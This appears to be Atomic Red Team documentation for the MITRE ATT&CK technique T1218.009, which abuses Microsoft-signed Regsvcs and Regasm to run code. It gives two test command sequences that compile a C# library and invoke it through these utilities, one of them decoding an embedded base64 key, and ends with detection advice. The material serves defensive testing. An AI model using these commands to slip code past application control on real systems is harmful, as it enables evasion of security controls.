# T1218.009 - Signed Binary Proxy Execution: Regsvcs/Regasm
Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Regasm Uninstall Method Call Test
Executes the Uninstall Method, No Admin Rights Required. Upon execution, "I shouldn't really execute either." will be displayed.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library #{source_file}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{output_file}
```

Invoke-AtomicTest T1218.009 -TestNumbers 1

### Atomic Test #2 - Regsvcs Uninstall Method Call Test
Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, "I shouldn't really execute" will be displayed
along with other information about the assembly being installed.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library /keyfile:$env:Temp\key.snk #{source_file}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{output_file}
```

Invoke-AtomicTest T1218.009 -TestNumbers 2

## Detection
Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.